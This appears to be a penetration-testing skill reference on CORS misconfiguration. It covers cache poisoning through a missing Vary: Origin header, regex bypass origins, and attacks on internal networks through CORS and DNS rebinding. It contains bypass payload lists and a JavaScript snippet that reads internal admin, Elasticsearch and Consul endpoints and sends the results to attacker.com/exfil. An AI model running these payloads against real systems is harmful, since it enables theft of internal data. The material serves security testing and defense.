# SKILL: CORS Misconfiguration — Credentialed Origins, Reflection, and Trust Boundary Errors: detailed technique reference

<!-- zhiyugo:resource:start -->
> ZhiyuGo reference material only. Inspect it explicitly through catalog resource tooling when the main Skill names this file; examples do not grant tools, authorization, or evidence.
<!-- zhiyugo:resource:end -->

<!-- zhiyugo:toc:start -->
## Contents

- [7. VARY: ORIGIN CACHING ISSUE](#7-vary-origin-caching-issue)
- [8. REGEX BYPASS PATTERNS](#8-regex-bypass-patterns)
- [9. INTERNAL NETWORK CORS EXPLOITATION](#9-internal-network-cors-exploitation)
<!-- zhiyugo:toc:end -->

## 7. VARY: ORIGIN CACHING ISSUE

### Problem

When the server reflects `Origin` in `Access-Control-Allow-Origin` but does **not** include `Vary: Origin` in the response, intermediary caches (CDN, reverse proxy) may serve the same cached response to different origins:

```text
1. Attacker requests: Origin: https://attacker.com
   Response cached with: Access-Control-Allow-Origin: https://attacker.com

2. Victim requests same URL (no Origin or different Origin)
   Cache serves response with: Access-Control-Allow-Origin: https://attacker.com
   → Victim's browser allows attacker.com to read the response (CORS cache poisoning)
```

### Detection

```bash
# Request 1: with attacker origin
curl -H "Origin: https://evil.com" https://target.com/api/data -I

# Request 2: with legitimate origin
curl -H "Origin: https://target.com" https://target.com/api/data -I

# Compare: if both responses have Access-Control-Allow-Origin: https://evil.com
# → cache poisoned, Vary: Origin is missing
```

### Exploitation

```text
1. Warm the cache: send request with Origin: https://attacker.com
2. Wait for victim to access the same cached URL
3. Cached ACAO header allows attacker.com to read the response
4. Attacker page fetches the URL → reads cached response with credentials
```

### Fix verification

```text
□ Response includes Vary: Origin
□ Cache key includes the Origin header
□ Alternatively: Access-Control-Allow-Origin is not reflected (hardcoded allowlist)
```

---

## 8. REGEX BYPASS PATTERNS

Common flawed regex patterns for origin validation:

| Intended Pattern | Flaw | Bypass Origin |
|-----------------|------|---------------|
| `^https?://.*\.target\.com$` | `.*` matches anything including `-` | `https://attacker-target.com` |
| `^https?://.*target\.com$` | Missing anchor after subdomain | `https://nottarget.com`, `https://attacker.com/.target.com` |
| `target\.com` (substring match) | No anchors | `https://attacker.com?target.com` |
| `^https?://(.*\.)?target\.com$` | Missing port restriction | `https://target.com.attacker.com:443` |
| `^https://[a-z]+\.target\.com$` | Missing end anchor for path | N/A (but misses subdomains with `-` or digits) |
| Backtracking-vulnerable regex | ReDoS | `https://aaaa...aaa.target.com` (CPU exhaustion) |

### Test payloads for origin validation bypass

```text
https://attacker.com/.target.com
https://target.com.attacker.com
https://attackertarget.com
https://target.com%60attacker.com
https://target.com%2F@attacker.com
https://attacker.com#.target.com
https://attacker.com?.target.com
null
```

### Advanced: Unicode normalization bypass

```text
https://target.com → https://ⓣarget.com (Unicode homoglyph)
```

Some origin validators normalize Unicode after comparison, while the browser sends the original — or vice versa.

---

## 9. INTERNAL NETWORK CORS EXPLOITATION

### Scenario

An internal-only API (e.g., `http://192.168.1.100:8080/admin`) is configured with:
```http
Access-Control-Allow-Origin: *
```

Internal APIs often use wildcard CORS because "only internal users can reach it."

### Attack chain

```text
1. Attacker sends victim (internal employee) a link to attacker.com
2. Attacker page JavaScript fetches internal API:
   fetch('http://192.168.1.100:8080/admin/users')
3. CORS allows * → response readable
4. Exfiltrate internal data to attacker server
```

```javascript
// On attacker.com — target internal API from victim's browser
const internalAPIs = [
    'http://192.168.1.1/admin/config',
    'http://10.0.0.1:8080/api/users',
    'http://172.16.0.1:9200/_cat/indices',  // Elasticsearch
    'http://localhost:8500/v1/agent/members', // Consul
];

internalAPIs.forEach(url => {
    fetch(url)
        .then(r => r.text())
        .then(data => {
            navigator.sendBeacon('https://attacker.com/exfil',
                JSON.stringify({url, data}));
        })
        .catch(() => {});
});
```

### Port scanning via CORS timing

Even without `Access-Control-Allow-Origin: *`, the attacker can infer internal service availability:
- **Port open**: connection established → CORS error (different timing)
- **Port closed**: connection refused → fast error
- **Host down**: timeout → slow error

### Combined with DNS rebinding

```text
1. Attacker controls attacker.com with short TTL (e.g., 0 or 1)
2. First DNS resolution: attacker.com → attacker's IP (serves malicious JS)
3. Second DNS resolution: attacker.com → 192.168.1.100 (internal IP)
4. JavaScript on the page fetches attacker.com/admin → now hits internal server
5. Same-origin policy satisfied (same domain) → response readable
```
